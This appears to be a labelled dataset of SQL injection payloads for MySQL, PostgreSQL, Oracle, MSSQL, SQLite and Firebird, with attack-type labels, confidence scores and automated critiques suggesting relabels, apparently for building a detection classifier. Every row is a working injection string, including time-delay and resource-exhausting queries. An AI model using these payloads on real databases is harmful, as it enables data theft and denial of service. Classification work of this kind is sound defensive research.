payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
-4173' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'jdwt' like 'jdwt,error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,25427,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-4173' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'jdwt' like 'jdwt
"1' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( 'bemh' = 'bemh",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,25428,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( 'bemh' = 'bemh"
"1%"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ""%"" = """,error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,25429,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ""%"" = """
"1'+ ( select 'tzyz' where 4912 = 4912 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,25430,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1'+ ( select 'tzyz' where 4912 = 4912 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1 ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 1205 = 1205",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,25431,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 1205 = 1205"
"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",time_blind,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'heavy_query' (P4) but labeled 'time_blind' (P5),heavy_query,postgresql,25432,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )"
"1"" ) as kuuf where 6908 = 6908",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,25433,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as kuuf where 6908 = 6908"
-6661' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'tbmu' like 'tbmu,error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,25434,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-6661' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'tbmu' like 'tbmu
1' ) ) as wjfj where 3802 = 3802,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,25435,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as wjfj where 3802 = 3802
"1"" ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""xsfg"" like ""xsfg",union_based,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,firebird,25436,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1"" ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""xsfg"" like ""xsfg"
-2516 ) where 3349 = 3349 or 4855 = 1806--,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,25437,boolean_blind,generic,Pattern match: 'or 4855 = 1806' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-2516 ) where 3349 = 3349 or 4855 = 1806--
"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25438,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null,null#"
1' ) as xqbq where 1619 = 1619 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,union_based,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,firebird,25439,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1' ) as xqbq where 1619 = 1619 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --
"-2782"" union all select 2109,2109,2109#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25440,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2782"" union all select 2109,2109,2109#"
1' ) as irck where 3660 = 3660 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,time_blind,mysql,0.9,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,25441,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) as irck where 3660 = 3660 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --
"1"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,25442,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --"
"1'+ ( select 'vedi' where 2774 = 2774 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,25443,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1'+ ( select 'vedi' where 2774 = 2774 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
1' ) where 6408 = 6408,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,25444,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 6408 = 6408
"1%' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = '",out_of_band,oracle,0.9,ctxsys_drithsx,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,25445,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1%' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = '"
"-3230"" ) ) as kbxc where 5007 = 5007 or 2107 = 8818",boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,25446,boolean_blind,generic,Pattern match: 'or 2107 = 8818' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-3230"" ) ) as kbxc where 5007 = 5007 or 2107 = 8818"
1' ) and ( 3020 = 3020 ) *6703 and ( 'lhfa' = 'lhfa,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,25447,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1' ) and ( 3020 = 3020 ) *6703 and ( 'lhfa' = 'lhfa
"1"" ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ""aall"" like ""aall",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,25448,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ""aall"" like ""aall"
1'|| ( select 'dyuw' from dual where 2037 = 2037,union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,oracle,25449,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'dyuw' from dual where 2037 = 2037
"-5181"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""qofp"" = ""qofp",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,25450,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-5181"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""qofp"" = ""qofp"
"-2838"" where 5442 = 5442 union all select 5442#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25451,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2838"" where 5442 = 5442 union all select 5442#"
